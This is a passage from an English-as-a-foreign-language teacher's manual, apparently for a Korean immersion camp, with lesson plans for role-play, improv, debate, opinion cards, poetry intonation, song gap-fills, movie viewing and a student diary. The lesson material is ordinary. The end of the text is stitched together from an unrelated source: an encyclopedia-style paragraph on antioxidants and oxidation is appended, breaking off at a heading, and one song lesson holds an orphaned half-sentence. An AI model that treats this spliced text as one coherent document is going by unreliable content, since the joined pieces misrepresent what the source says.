Go through the instructions in the workbook with the whole 
class, so that the students fully understand what they have to 
do.

Activity (30 minutes):
Allocate classroom space for each group and let the role-play 
begin. The teacher can go from group to group, pretending to 
be a waiter and offering drinks, small snacks, etc. Set a time 
limit (e.g. 15-20 minutes). 


Below is the student worksheet information:

Imagine you could choose any identity for yourself. What name 
would you choose? What nationality? What job? What background? 
Are you married? Etc.

Everyone in the class is at a party at the Ritz Hotel in 
London. Go around talking to and meeting as many people as 
possible as your “new” identity. Remember, you can be as 
glamorous or as important as you like.

Before you start, make up a background for yourself. Think 
about the following:
1.	Your name, age, nationality.
2.	Your job (pop star, Prime Minister, head of a 
multinational company, actor, nuclear physicist, 
hairdresser for the stars, TV personality, supermodel, 
photographer, film director, plastic surgeon, world 
famous violinist, famous detective story writer, etc.) 
Remember you can choose any job!
3.	Where you live (place, what sort of house, etc.)
4.	Your family (married, single, divorced, etc.).
5.	Why you are in London. How long you are staying.
6.	Anything else you can think of.

Here are some useful phrases you can use:

When introducing yourself:
“Hello. I’m…” 
“Hi there! My name’s…” 
“I don’t believe we’ve met.”

Introducing another person :
“(x) may I introduce (y).” 
“(x), I’d like you to meet (y).” 
“(x), this is (y).”

When leaving to talk to someone else:
“It was nice meeting you. See you later.”

Talk to each person for about two minutes. Try to find out 
his/her job and one or two other things about him/her.

Summary (5 minutes):
Ask one or two students to introduce some people they met and 
to tell the rest of the class one or two things about them.

===Strangers on a Train===

Objectives:
This is an excellent activity for students to practice oral 
fluency.
Materials needed:
*	Student workbook
*	Pens / pencils
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Explain to students that they will be getting practice 
speaking through role-play and other improvisational 
activities. There are two warm up activities, choose one and 
run it. In the first activity, two students must take the 
stage and the teacher will whisper one line of dialog to one 
of the players.

Possible conversation starter ideas:
*	Are you lost?
*	You’re in a lot of trouble.
*	Let’s pretend that yesterday never happened.
*	You shouldn’t have come here.
*	We are never going to get out of here alive.
*	I’m going to call the police.
*	We have to be quiet.
*	Where is my wife (or husband)?
*	Where is the money?
*	Don’t cry.
*	We were fired.
*	Is your name Sam?
*	Why was I fired?
*	He won’t confess to the crime.
*	She doesn’t want to talk to you.

The other player must not know the line in advance. Once the 
player delivers the line, the other player should respond 
appropriately, and the improvisation should continue until a 
signal is given to stop. Then you can discuss the performance 
with your players and audience. You can use the following 
guide questions. 
*	Were you surprised by the second player’s response to the 
first line? Why or why not? Would you have responded in a 
similar way? 
*	How would you describe the first player’s tone of voice, 
attitude, emotional state, or mood when he spoke the 
first line?
You may run through this activity several times so that many 
students get the chance to participate.

The second activity is another improv game. This activity uses 
contrasts and provides conflicting character traits and 
emotions as a means to begin improvisations. The teacher 
should have the players take the stage and then read aloud the 
scene and character descriptions for each player. The students 
should then begin role-playing their part 

Character roles:
*	The scene: Two students are comparing each other’s report 
cards. 
Player One: You’re stupid. You’ve failed every subject, 
even gym. 
Player Two: You’re smart you’ve earned A’s in every 
subject including math, chemistry and English literature. 

*	The scene: Two passerby’s are outside a bank where 
robbers are holding the people at the bank hostage 
Player One: You’re brave. You want to sneak into the 
building and try and free the hostages. 
Player Two: You are not brave. You want to stay as far as 
possible from the bank.

*	The scene: A man and a woman at a party have just been 
introduced 
Player One: You are brave, unafraid, and bold. You make 
it clear that you like this person. 
Player Two: You are very shy.

*	The scene: Two students are discussing their new teacher. 
Player One: You are mean and nasty. You don’t have one 
nice thing to say about the teacher. 
Player Two: You are very kind. You only say nice things 
about the teacher. 

*	The scene: Two people have been stuck, trapped for an 
hour in an elevator. 
Player One: You believe that someone will come rescue you 
soon. 
Player Two: You think that you will be stuck, trapped in 
the elevator all day.

You may use the following guide questions when discussing the 
performances with your players and audience. 
*	Did the players talk about their characteristics or did 
they show that they possessed them?
*	Did the improvisation develop as you expected, or were 
you surprised by the direction in which it turned?

Run through a couple of times so that different students get 
the chance to participate. 

Activity (30 minutes):
Now it is time for the main activity, one that all students 
will get to participate in. Get the students to imagine they 
are strangers in a train compartment – get them sitting 
opposite each other, in groups of 3-5. Elicit what people 
usually talk about on the train- the weather, where they are 
going/coming from, etc. Tell the students you are going to 
give them a line to memorize and that it’s secret – you must 
give them out, have the students memorize them, and then take 
them back. Then explain what they have to do- each student 
must say their lines as naturally as they can in the 
conversation, without the others guessing it is their line. So 
they have to direct the conversation so that they can say 
their line naturally, without the others noticing. At the end, 
the students then tell each other what they thought were each 
other’s lines.

Sample lines for the students to memorize and use in their 
conversations:
*	My husband (wife) died last week.
*	I bought a big, new house last week.
*	I was in jail for three years.
*	I am a famous actress (actor).
*	I have no more money.
*	I am running away from my boyfriend (girlfriend).
*	I am leaving home and I will never return.
*	I have cancer and will die soon.
*	There is blood on my shirt.
*	I can speak five languages fluently.

Summary (5 minutes):
As a wrap up, if there is still time left in the class, you 
can have the students each think of lines to give each other 
and repeat the activity

==Speaking==




===Hints===
A little every day… 

When giving a speech, make sure that you speak a little slower 
than normal. People need time to hear what you are saying.

Eye contact is very important when you are speaking. Try to 
look at everyone in your audience.

Try to speak as much as you can when answering questions. 
Remember IRE. Give your teachers an idea, a reason and an 
example. 

Choose a time every week to speak English with your friends. 
Watch the same movie together and then talk about it. 

Keep a spoken journal. Use a tape recorder or your computer to 
record your thoughts every day. You will feel great as you 
hear yourself improve.



===Ifs===

Objectives:
The objective of this lesson is to build conversation skills 
and for the students to express their opinions in English. 
Students also improve sentence structure, grammar, and 
vocabulary. These objectives are achieved by asking questions 
from the pack of cards and discussing the opinions of each 
student. The purpose of this lesson is to generate discussion. 
Most questions will not yield a single sentence answer.
Materials needed:
*	‘Ifs’ cards.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Photocopy the cards on the following pages. Cut out, fold, and 
laminate them if possible. These are the cards that will build 
your deck of choices. This lesson can be done in the normal 
classroom environment or somewhere outside where the class can 
be seated as a group.

Warm Up (10 minutes):
Explain to the students the objectives of the lesson. Stress 
that the purpose of the exercise is to generate discussion and 
not just to obtain single sentence answers. Reinforce the IRE 
concept described at the beginning of this manual.

Activity (30 minutes):
The teacher chooses a card from the pack of ‘Ifs’ cards and 
gives his/her answer to the question (It is a good idea to 
choose this question carefully to make the first exchange of 
opinions interesting). Each student should answer the question 
and give his or her opinion. 

Correct any grammar or vocabulary problems.

Summary (5 minutes):
Congratulate the class on their effort. Point out any 
outstanding responses that the students gave.

===Debate Class===

Objectives:
To learn to politely disagree, to speak in public, and give 
reasons for an opinion.
Materials needed:
*	Whiteboard
*	Student workbook
*	Pencils or pens
Vocabulary substitution:
Introduce the following vocabulary:
pro, con, debate, agree, I disagree because…, in my opinion…, 
I see your point but…, Yes but…
Procedure:
Setting Up the Classroom:
Write the objectives, vocabulary, and the debate topic or 
topics for the groups on the board. The topic(s) can be 
suggested, brainstormed, or assigned, depending on the ability 
level of the group. 

Warm Up (10 minutes):
“Yes, but …” game
Divide the class into two groups and line them up in two rows, 
all facing the same direction. Have the end students in each 
of the lines turn and face each other. Play a game of rock-
paper-scissors to see which team is first. Select a topic from 
the board. The winner of rock-paper-scissors must respond to 
the topic with a “Yes, but...” sentence. This student then 
runs to the end of his line, the line shifts position, and the 
student at the front of the other line must say a “Yes, 
but...” sentence in reply to what the first student said. The 
end students are always facing each other. Repeat the process 
until all the students have spoken. The objective is to 
complete a full cycle of students as fast as possible.

For example, the topic sentence could be “ Winter is the best 
season.”
The reply “ Yes, but many people like the spring.”
And the next “ Yes, but most people like the summer best.”
And so on. 

Activity (30 minutes):
Select an appropriate topic for debate, for example, “Is it 
better to have school uniforms” Remind the students to make 
polite arguments. Assign one group the pro, or in favor, side 
of the proposition and the other group the con, or against, 
side of the proposition. They are given about seven minutes to 
prepare their arguments. One student from each group presents 
the arguments to the class. 

Give the students another seven minutes to prepare a rebuttal 
(arguments against the first arguments given). Two different 
students are chosen to present the rebuttal to the class.

Repeat the process one more time, so that a second round of 
rebuttals are prepared. Ensure that different students are 
chosen to give the presentation to the class.

Budget another five to seven minutes to prepare the summation. 
Students must give a summary of the points made with no new 
arguments allowed. Ensure that different students are chosen 
to give the summaries to the class.

Summary (5 minutes):
The teacher praises the students for a job well done, saying 
something like “the points were well made, and easy to follow 
or to understand”.


===Speaking Skills===

Objectives:
To practice different speaking skills: pronouncing the words 
with variety using intonation, stressing through loud and soft 
sounds, or fast and slow sounds, or pausing, to prepare for 
public speaking.
Materials needed:
*	Workbook
*	Pencils / pens
*	Whiteboard
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Arrange the desks so students can work in groups of three or 
four. Write the Robert Frost poem, with markings of the first 
stanza, on the board.

Warm Up (10 minutes):
Practice the tongue twisters
“ The thirty-three thieves thought that they thrilled the 
throne throughout Thursday.”
“ How many chucks could a woodchuck chuck if a woodchuck 
could chuck wood?”
“ While we were walking, we were watching window washers 
wash Washington’s windows with warm washing water.”
“ There those thousand thinkers were thinking how did the 
other three thieves go through?”
Model them, if necessary, and then have the groups practice 
them. Ensure that each one performs one for the class. An 
optional game is to time each group to see who can finish 
saying all twisters (perfectly) in the shortest amount of time. 
The purpose is to practice the sounds found in the activity, 
“th” and “w”, which can cause problems for Korean speakers.

Activity (30 minutes):
Explain the symbols following the poem. Then read the first 
stanza of “ Stopping By Woods on a Snowy Evening” by Robert 
Frost, using the symbols for the sounds used and modulating 
your voice to correspond to the symbol. 

Repeat the stanza several times, changing your modulation each 
time. For example, first read the stanza in a monotone voice. 
Ask the students to suggest how you should improve the 
monotone version and write the students suggestions onto the 
stanza written on the board. Second, read the stanza in a high 
voice, or fast voice, with pauses and so on, to model how the 
voice can be changed to give interest to reading and speaking.

Have each group practice their stanza (the group number is 
given in brackets next to the stanza). They should mark the 
stanza with the symbols to indicate how they think it should 
be read. Each person reads their group’s stanzas according to 
the markings (the teacher should also encourage body language 
or facial expressions) to give the feeling of the poem. The 
other groups mark on their papers what they thought the 
markings were that the group reading their paper to the class 
made.

With the remaining time have them read one of the other poems 
provided. Encourage them to apply the speaking skills they 
have been practicing.




“ Stopping By Woods on a Snowy Evening”
by Robert Frost

Whose woods these are/I think I know.
His house is in the village though;   {Group practice}
He will not see me/stopping here
To watch his woods /fill up with snow.

My little horse must think it queer
To stop without a farmhouse near   
Between the woods and frozen lake   {Group One} 
The darkest evening of the year.

He gives his harness bells a shake
To ask if there is some mistake.    {Group Two}
The only other sound's the sweep
Of easy wind and downy flake.

The woods are lovely, dark and deep,
But I have promises to keep,     {Group Three}
And miles to go before I sleep,
And miles to go before I sleep.

  = say the word louder than the other words in the 
sentence.

  = say the word softer than the other words in the 
sentence.

  = speak it faster, to give interest by changing the 
speed, to give less important words or ideas

  = speak slower, to stress a word, give it feeling, or 
for the more important words

/ = pause for effect, to emphasize or stress a word, to give 
the feeling, or to give time for the listener to understand 
better what is being said.

= put additional stress on the most important word in the 
sentence.


WATCHING
By Andrea Shavick

What if I told you
The stars in the sky
Were not really stars at all

But eyes

Winking and blinking
And spying on you
Watching your every move

Try and imagine it

Now try to fall asleep
On a clear night
If you can.



PREDICTABLE
By Andrea Shavick

When I come out of school today
I know what Mum is going to say:
How was school?
What did you do?
Who did you play with?
What was for lunch?
How did you get that bruise on your knee?
Why is it a secret?
Please tell me.

When I come out of school today
I know what I am going to say:

Can’t remember.

Summary (5 minutes):
The groups tell each other what markings they made on their 
stanza, the teacher writes them on the poem that was written 
on the board, and they check to see if they were correct. Say 
goodbye, good job, I heard improvement, …



===Get to Know Your Classmates===

Objectives:
The students will practice speaking English in a fun and 
interesting way while learning about each other.
Materials needed:
*	Student Workbook
*	Pens / Pencils
*	Scissors
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Make four copies of the number sheets following this lesson 
summary. Cut them out and, if possible, laminate them. You 
will need one deck of cards for each group of students you 
create.

Warm Up (10 minutes):
Using the list of questions in the student workbook have a 
student in the class choose a number and ask the teacher the 
corresponding question. The teacher will answer the question 
as a model for how the students will answer the questions 
(e.g. complete sentences).

Activity (30 minutes):
The students work in groups (3-5 students each). Give each 
group a set of number cards and have them turn to the list of 
questions in their workbook. Tell them to place the number 
cards face down on the table. The first person in the group 
turns up a number, looks at the equivalent question on the 
handout and asks someone in the group the question. That 
person must try and answer (but tell them that they can always 
‘pass’ if they can’t think of an answer or don’t want to 
answer.) The next person now picks up a number and again asks 
someone the appropriate question. The activity continues in 
this manner.

Questions:
1.	Say one or two ways in which you are like your mother of 
father.
2.	Say something about the town or village where you were 
born.
3.	Say what you are planning to do tonight.

===In My Opinion===

Objectives:
This is a discussion/speaking activity for groups of 3-5 
students where students are given the opportunity to present 
their opinions on various topics and agree or disagree with 
each other.
Materials needed:
*	Student Workbook
*	Pens / Pencils
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Make four copies of the opinion cards following this lesson 
summary. Cut them out and, if possible, laminate them. You 
will need one deck of cards for each group of students you 
create.

Warm Up (10 minutes):
Have the student cut out the opinion scorecards from their 
workbooks. Explain what the numbers on the opinion cards stand 
for:
 
-2 = strongly disagree
-1 = disagree
0 = you are undecided
+1 = agree
+2 = strongly agree

Four sets are provided in the workbook but the students only 
need one. Do a sample opinion in front of the class.

Activity (30 minutes):
Put the students into group of three or four and give each 
group a stack of opinion cards. The opinion cards are shuffled 
and placed face down on the table. The first student turns up 
a card and reads out the statement. Each person now shows 
his/her opinion by placing an appropriate number card in front 
of him/her. The first student now gives his/her opinion. After 
this the rest of the group can join in. Encourage them, in 
particular, to concentrate on students whose opinions are 
different or those who are as yet undecided. Also explain that 
if they change their opinion during the discussion, they show 
this by changing the number card in front of them. For 
example, a student might have placed 0 at the start, showing 
s/he is undecided. Then during the course of the discussion 
s/he starts to agree with the statement, so they can exchange 
the “0” card for the “+1” card. Tell them to spend 
approximately 3-5 minutes for each statement. The second 
student now turns up a card and the whole thing begins again. 

Summary (5 minutes):
Conclude the activity with a general class discussion. Ask 
groups to select the statement that caused the greatest 
argument.




&gt;	Men and woman can never really be equal.
&gt;	The future is frightening rather than exciting.
&gt;	The Internet will completely change the way people work, learn, 
shop and do business.
&gt;	Politicians are mainly interested in advancing their own careers.
&gt;	It is better to take any job than to be unemployed.
&gt;	English is a fairly easy language to learn.
&gt;	Today’s pop music is not as good as it used to be.
&gt;	Smoking should be banned in all public places.
&gt;	Living in a city is better than living in the country.
&gt;	There are no such things as ghosts, flying saucers, etc.
&gt;	There is too much money in sport nowadays,
&gt;	It is better to stay single than to get married.
&gt;	There are certain jobs that are not really suitable for women.
&gt;	When you speak a foreign language, it doesn’t matter if you make 
mistakes, as long as people understand you.
&gt;	My country is not as nice as it was ten years ago.
&gt;	You can tell a lot about a person from the clothes he/she wears.
&gt;	Murderers should always be executed rather than be given life 
imprisonment.
&gt;	Marriages work best when couples are from the same background, 
race, and religion.
&gt;	People who follow fashion are fools and probably have more money 
than sense.
&gt;	The most important thing about a job is the money.




===Free Conversation===

Objectives:
To improve the students conversation skills and introduce new 
vocabulary. This lesson provides an opportunity for you do 
explore ideas and topics more relevant to the student’s 
experience.
Materials needed:
*	No materials are required
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Arrange the desks or chairs in a circle to promote a group 
dynamic during the conversation.

Warm Up (10 minutes):
Brainstorm some topics / current events that the students are 
interested in.

Activity (30 minutes):
This class is a free conversation class. At the beginning of 
class, the teacher may generate a list of topics from students 
that they would like to discuss, for example: boys/girls, 
movie stars, politics, pop groups etc.). Then the teacher will 
lead the class discussion. The teacher may also prepare their 
own topics for class discussion (current events, she died 
because of…, etc.). This class is a great way to generate 
student discussion and for students to enhance their English 
speaking skills.


Summary (5 minutes):
Point out any particularly good arguments or points of 
discussion that were made. Thank all the students for their 
participation.




===The Sport Star Interview===

Objectives:
For the students to develop interviewing skills including 
question creation and note taking. Students will develop their 
creativity as the make up the questions and answers in the 
interview. Students will be encouraged to speak clearly and 
loudly during the interviews.
Materials needed:
*	Student workbook
*	Pens / pencils
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Arrange the desks or chairs in a circle to promote a group 
dynamic during the conversation.

Warm Up (10 minutes):
The class begins with a general discussion about sports. The 
teacher should ask the students which athletes are popular. 
The teacher can ask the students why those athletes are 
popular. The teacher should then ask the class to generate the 
names of popular/famous sports stars. These names should be 
written on the board. The teacher should make sure the class 
has a good choice of athletes (at least twice as many as the 
number of students).



Activity (30 minutes, 15 minutes for the creation of 
interviews – 15 minutes for performance):

The class should be placed into pairs. One is the interviewer 
and the other will be a sports star.

Ask the class if they have ever seen a sports interview. Get 
the class to think of typical questions that are asked in a 
sports interview. These questions should be written on the 
board.

Ask the pairs to choose one of the sports stars on the board 
and not to tell the rest of the class whom they have chosen.

Take a bit of time to encourage the students to speak clearly 
and loudly during the interviews, as the class has to be able 
to hear them to decide the name of the athlete being 
interviewed.

The pairs (interviewer and sports star) will then create a 
short question and answer interview (should be about 2 to 3 
minutes in length). At no point in the interview should they 
mention the sport the star plays or the star’s name.

When the students have finished writing their interviews, they 
will perform them for the class. At the end of the interview 
the class should guess the identity of the famous athlete.

Summary (5 minutes):
Take 5 minutes at the end of class to comment of the 
creativity of the interviews, point out pairs that spoke well 
during their interview, and talk about the different athletes 
that were chosen.







==Media==




===Hints===
A little every day...

Choose one English radio program to listen to. Listen to it 
every day. When you get used to the person’s voice, choose 
another radio program. You can find a lot of radio stations on 
the Internet.

When you watch English TV programs at home, cover up the 
Korean subtitles. Then you will have to listen.

Use the Internet to watch videos on your computer. You can 
save the videos and watch them more than once. If you try 
writing down what the people say, you can really improve your 
listening skills.

Listen to English songs. You can find the lyrics on the net. 
This will help you understand the songs.

When you watch a movie at home, turn off the subtitles. If you 
have problems understanding, you can always turn them back on.



===Advertising===

Objectives:
The objective of this lesson is to communicate using 
advertising language. Students will also develop a new product 
and advertise it in a print display format.
Materials needed:
*	Blackboard
*	Student Workbook
*	Pens / Pencils
*	Colored markers or pencils.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this class.

Warm Up (10 minutes):
Ask students what they know about advertising and where they 
can find advertisements (Magazines, Newspapers, TV, Radio, 
Billboards, Shop fronts, Internet, Subway, Bus, etc.).

Ask the students if they find any type of advertising annoying 
(e.g. SPAM, Pop-up ads). Ask students what their favorite 
advertisements are.

Activity (30 minutes):
Brainstorm on the blackboard different products such as toys, 
computers, weapons, furniture, household items, etc.

Divide the class into groups of 2 or 3 students. Tell the 
students that they must combine 2 or more products together to 
develop a new product. (e.g. Cell phone + Lighter = A cell 
phone that can light a cigarette)

Have students think about the following points:
*	What does it do?
*	Who would buy it?
*	Where could people buy it?
*	How much would it cost?
*	Would it be a seasonal item?

In their groups students must design a newspaper advertisement 
for their new product. Be sure to emphasize the importance of 
copy rather than illustrations. Distribute colored markers and 
pencils for the students to color their advertisements after 
the copy has been completed.

Summary (5 minutes):
Choose creative advertisements and display to the other class 
members. Review the objectives of the lesson and conclude.




===Internet EFL Scavenger Hunt===

Objectives:
To give the students a fun way to discover EFL resources on 
the Internet that they can later use at home.
Materials needed:
*	Computers with internet access(one per pair)
*	Student workbook
*	Pencils / pens
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
First, make sure that all the computers to be used are 
functional and can connect to the Internet. Make sure that all 
students have their workbooks with them and that there are 
enough chairs for all the students.

Warm Up (10 minutes):
Put the students into pairs (two students per computer) and 
explain the rules of the activity:
*	The object of this activity is for the pairs of students 
to find as many of the answers to the question in their 
workbook in as little time as possible. The first pair 
that answers all the questions correctly wins.
*	Students may only work with their partner and not share 
information with other pairs.
*	Students must do all searching using English search 
engines such as Google. If students go to 
http://www.google.com and it is in Korean, click on 
“Google.com in English” to change it to English.
*	Checking e-mail, chatting, instant messaging, looking at 
CyWorld, or looking at pages not related to the scavenger 
hunt is not allowed.

Activity (30 minutes):
Once the students have been briefed on the rules, the teacher 
needs to make note of the time and say, “GO!”

While the students are working, the teacher needs to circulate 
through the computer lab monitoring the students’ activity. 
The teacher will need to sign the students’ workbooks when the 
students complete the word search.

While a pair declares that they have all the answers, the 
teacher needs to check their answers. If any answers are not 
correct, tell the students to fix them. The first group to 
have all the questions correct wins and may or may not be 
given a prize.

===Song Gap Fill and Discussion===

Objectives:
The objective of this lesson is to refine the student’s 
listening skills. Students also gain valuable discussion 
practice.
Materials needed:
*	Blackboard
*	Student Workbook
*	Pens / Pencils
*	Music CD or file
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Prepare the Music CD or file for playback. Have the song lyric 
sheet and CD/music file prepared before class. (Teachers 
should choose a song that has a story in its lyrics)

Warm Up (10 minutes):
Talk to the class about music in general. Some points the 
teacher can discuss are:
*	Favorite musical artists.
*	Favorite musical genres.
*	How do the students listen to their music? (CD, MP3…etc)
*	How many CDs do the students have in their collections?

Explain to the students that many songs have a story in their 
lyrics. Ask the students if they can think of any songs that 
are of this type.

Activity (30 minutes):
Tell the class that they are going to listen to a song for 
which the lyrics will be provided. There will be some missing 
words in the song that they must fill in.

Tell the class that they are going to listen to the song once 
in its entirety. Tell the students to concentrate not so much 
on the words but on the rhythm of the song and how it makes 
them feel. Play the song once entirely.

Ask the students their feelings about the song and how it made 
them feel. Ask them to predict the story behind the song.

Listen to the song verse by verse so the students can fill in 
the gaps in the lyrics. Re-play each verse as many times as is 
necessary for the students to complete all the missing words.

When completed, talk about the meaning behind the lyrics and 
discuss if this matched their earlier prediction.

should all be given the opportunity to present their opinions 
during the lesson. Review the objectives of the lesson and 
conclude.



===Understanding Song===

Objectives:
By listening repeatedly to a song, students will write out the 
lyrics they hear, collectively arriving at a complete version. 
It should improve listening ability and help in sharpening 
note-taking skills. The class discussion of the theme that 
follows, will engage their abstract thinking ability as well.
Materials needed:
*	Blackboard
*	CD player or computer with selected pop/rock song
*	Pen and paper
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Have the music queued up to play for the class.

Warm Up (10 minutes):
Talk about song structure: Verse – Chorus – Verse – Chorus – 
Instrumental – Verse –Chorus, etc. Then explain how good songs 
have profound meaning, a theme useful for us to know.

Activity (30 minutes):
Play the first verse of the song, stop it, and elicit lyrics 
from the students. Write them out on the board, having them 
write their own copies simultaneously. Repeat as many times as 
necessary until first verse is complete. Do the same for the 
chorus section. Provide difficult words where required. Point 
out the instrumental section and ask what instruments they 
hear. Write the names on the board. When lyrics to the whole 
song have been written on the board and each student has 
written his/her own copy, play the song in its entirety for 
them so they can read the lyrics. Ask them to think about 
meaning while they listen. Then, write “theme” on the board 
and discuss how to create a “theme statement’. Tell them this 
is a sentence that describes both the meaning of the song and 
gives a general description of the same situation occurring in 
real life. Illustrate a method for deciphering theme. Each 
teacher may have his/her own way of doing this. As an example, 
one might introduce the ideas of plot and conflict. Recount 
the story of the song, and identify the problem. Explain that 
by considering these two elements, one can figure out the 
theme. Depending on amount of time remaining, students can be 
divided into pairs and instructed to write out their own theme 
statement, or the teacher can generate a whole class 
discussion to arrive at a theme statement written on the 
board. 

Example Song
“Gone Daddy Gone” by The Violent Femmes has clear, easy to 
understand lyrics with a precise message about teenage 
relationship. This worked well with high school students, and 
may also be suitable for middle school students. The Plot is 
about a boy who was in love with a girl who is very attractive 
to many other boys, so he leaves her (“Your love is gone”). 
The conflict is that the girl cheats on the boy, thus 
destroying their love. By taking these two concepts, students 
can write their own theme statement beginning with the 
structure, “After hearing this song, I think the singer wants 
me to understand…”(that I should not fall in love with someone 
who is in love with being attractive to others”, for example).

Summary (5 minutes):
Students should come away with the knowledge of how English 
lyrics are formatted in a song, with a complete concrete 
example. Additionally, they will have practiced their 
listening skills, and exercised their intellects by learning 
how to figure out theme by way of understanding plot and 
conflict.



===Sight and Sound===

Objectives:
Students will learn the importance of using both their hearing 
and sight to understand movies in English. Students will 
cooperate in the construction of their understanding of a 
text.
Materials needed:
*	2 DVD copies of Mrs. Doubtfire (The teacher should choose 
a piece of film of appropriate length. We suggest the the 
last scene from the Robin William’s movie Mrs. Doubtfire. 
If you choose a different movie the selected scene should 
be between 10 and 15 minutes in length.)
*	2 television and DVD players
*	Students workbook
*	Pens / pencils.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
The class must be split in two. Two rooms need to be prepared, 
with the scene queued, to view the selected scene. Watch the 
scene two or three times so you are familiar with it.

Warm Up (10 minutes):
Discuss with the class their viewing habits. Find out how many 
English movies the students watch. The class should discuss 
why viewing movies in English is difficult.

Activity (30 minutes):
The students are split into their two groups. One group 
watches the scene without the sound. The students must write 
down in their workbook what they think the scene is about and 
note any clues that helped them. The students do this 
individually.

The other group will listen to the scene but won’t be able to 
watch it. Using the dialogue and background noise as clues, 
they too will decide what is happening in the scene. The 
students do this individually.

The two groups them come together and pair off. The pairs work 
together to get a more complete picture of what happened in 
the scene.

Summary (5 minutes):
The paired groups will discuss with the class how they came to 
their conclusions and will compare their stories with other 
paired groups. Take some time to stress the importance of 
using all the available clues when watching movies.



===Movie Visual Response===

Objectives:
The objective of this lesson is for the students to 
communicate their feelings in a written form. Students will 
also improve their skills in the usage of adverbs and 
adjectives.
Materials needed:
*	Student Workbook
*	Pens / Pencils
*	DVD Movie
*	DVD Player and Monitor.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Have the chosen DVD ready to play at the selected scene and 
students seated near the monitor. The teacher should choose a 
movie and a scene that has strong visual images and/or 
scenery. For example, Scene 16 from “Jumanji”.

Warm Up (10 minutes):
Tell the students to look at the images of the puppy and the 
Hindenburg in their workbooks. Tell the students to write in 
their workbooks their feelings about these pictures. They 
should write, firstly, in their native language and then 
translate these words into English using a dictionary. 
Finally, the students should write a short paragraph about 
each of the pictures using the vocabulary they have found.
   

Activity (30 minutes):
Play the selected scene to the students. Be sure the sound is 
muted if the scene contains speaking. As in the warm-up, tell 
the students to write their feelings about the scene in their 
native language. The students should then translate the words 
to English using a dictionary. Divide the class into pairs and 
have the students discuss their feelings about the scene. 
Finally, the paired groups should write a paragraph describing 
their feelings about the scene.

Summary (5 minutes):
Scan the produced stories and read some of the more creative 
ones to the class. Review the objectives of the lesson and 
conclude.




===Extensive Viewing===

Objectives:
Students will learn the importance of watching movies very 
closely. Students will work on study skills—i.e. paying close 
attention to subject and anticipating answers to questions.
Materials needed:
*	The teacher should choose a piece of film of appropriate 
length. For this lesson, the class will watch the first 
scenes from Harry Potter and The Sorcerer’s Stone. 
Teachers can choose their own movies/scene but will have 
to generate an appropriate list of questions. The 
selected scene should be about 25 minutes in length. This 
lesson has a prepared series of questions based on the 
first scenes from the Harry Potter and the Sorcerer’s 
Stone. The questions are of a type that necessitates a 
close viewing of the scene. The worksheet will cover the 
first 16 minutes of the film. The last 8 minutes should 
be left open for student-generated questions.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
The classroom should be prepared for the viewing of movies. 
The students should sit in such a way as to make the viewing 
of the scene easy.

Warm Up (10 minutes):
Discuss with the class their viewing habits. Find out how many 
English movies the students watch. The class should discuss 
why viewing movies in English is difficult.
Show the first few minutes of the selected scene and then stop 
the scene. Ask difficult questions about the scene (e.g. -----
-------------).

Have the students open the worksheet and tell the students to 
pay close attention to the movie. The teacher should inform 
the students the importance of watching the time code on the 
film as a way of anticipating the timing of the answers.

Activity (30 minutes):
The students should be given 3 minutes to look at the 
questions. Students should be reminded to be always looking 
ahead at the next question. The students watch the film and 
answer the questions at the same time. The film cannot be 
stopped.

At the 20 minute mark the film should be stopped and the 
students instructed to watch the last 5 minutes and create 
their own questions.

At the end of the scene the students should question each 
other using their own questions.

Summary (5 minutes):
The teacher should stress the importance of watching movies 
closely, as anything could be important. The teacher should 
remind the students to think about what kind of questions can 
be asked about a movie/or other text. By anticipating the 
questions, the students will be better prepared to give the 
answer.



==My Jump Into English Diary==

This is the part of the student workbook that students can use 
to write down their thoughts. Students may write about what 
they did today, things they like or dislike, or ideas they may 
have. There are pages to write in each night that the students 
are staying at the Jump Into English program. They must 
complete each one. Give your students an email address for you. 
Have them write it in the space provided.
My teacher’s email address is:


On Wednesday night the students must use the computers in the 
multimedia room to email a diary entry to you. This will help 
you practice writing in English and provide an assessment tool 
for the student’s performance. 


My Jump Into English Diary
Example


Date: 
27 October 2005
My favorite meal today was…
Today at lunch we had spaghetti. I really like spaghetti!
What I did today.
Today I was sad because it was my birthday and I had to be 
at school.
But it was okay because my friends sang “Happy Birthday” to 
me.
Today we did the Moon Survival lesson.
I liked it because I am interested in space.
Tomorrow we are going to play the Amazing Race.
I hope it is fun.
Learning log.
Today I learned about writing poems.
They were five line poems and they were a lot of fun.
It was hard to think of many English words but I used my 
dictionary.
My teacher also helped me.





 

==EFL Resources==

The purpose of this part of the student workbook is to help 
the students study English on their own after they leave the 
Jump Into English program. Using the Internet can be a very 
helpful way of studying and practicing English. Students 
should be encouraged to use it!

===Hints===
A little every day…

The Internet is a great place to find things to listen to. You 
can find radio stations, videos from around the world, and 
music to download. If you do any voice chatting, be careful.

Join a chat room like the one at Dave’s ESL Café. You can find 
people from around the world to talk to.

You can find a lot of things to read on the Internet. There 
are magazines, newspapers and lots of fiction. Do a little 
research about your favorite author or book.

You find a wealth of English games on the Internet to practice 
your English skills. Just put “English games” into your 
browser and see what you can find.

If you have a problem with grammar, check out the Internet. 
There are lots of grammar teachers waiting to help you.

'''Antioxidants''' are compounds that prevent or slow a chemical change called oxidation. A commonly recognized oxidation reaction is the rusting of iron, in which iron reacts with oxygen to form iron (ferrous) oxide. Similar reactions take place within foods and within the human body itself.

Heat is often released in the process of oxidation.

==In the Human Body==

